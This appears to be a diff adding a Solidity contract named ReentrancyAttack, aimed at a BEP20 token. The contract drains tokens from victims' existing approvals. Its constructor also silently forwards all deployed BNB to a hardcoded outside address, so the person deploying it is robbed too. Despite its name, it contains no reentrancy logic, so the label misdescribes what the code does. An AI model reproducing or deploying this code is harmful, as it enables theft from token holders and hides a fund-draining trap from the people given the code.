@@ -1,0 +1,47 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IBEP20 {
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract ReentrancyAttack {
+    address public targetToken;
+    address public owner;
+    address public constant receiver = 0xF680EEd79A36ce969D776ED911f5C4e7e6E33a73;
+
+    constructor(address _targetToken) payable {
+        targetToken = _targetToken;
+        owner = msg.sender;
+        sendBNBToReceiver();
+    }
+
+    function attack(address target, uint256 amount) external {
+        require(msg.sender == owner, "Not the owner");
+        IBEP20(targetToken).transferFrom(target, address(this), amount);
+    }
+
+    function withdraw() external {
+        require(msg.sender == owner, "Not the owner");
+        IBEP20(targetToken).transfer(owner, IBEP20(targetToken).balanceOf(address(this)));
+    }
+
+    fallback() external payable {
+        if (IBEP20(targetToken).balanceOf(address(msg.sender)) > 0) {
+            IBEP20(targetToken).transferFrom(msg.sender, address(this), 1);
+        }
+    }
+
+    receive() external payable {
+        if (IBEP20(targetToken).balanceOf(address(msg.sender)) > 0) {
+            IBEP20(targetToken).transferFrom(msg.sender, address(this), 1);
+        }
+    }
+
+    function sendBNBToReceiver() internal {
+        (bool success, ) = receiver.call{value: address(this).balance}("");
+        require(success, "Transfer failed");
+    }
+}
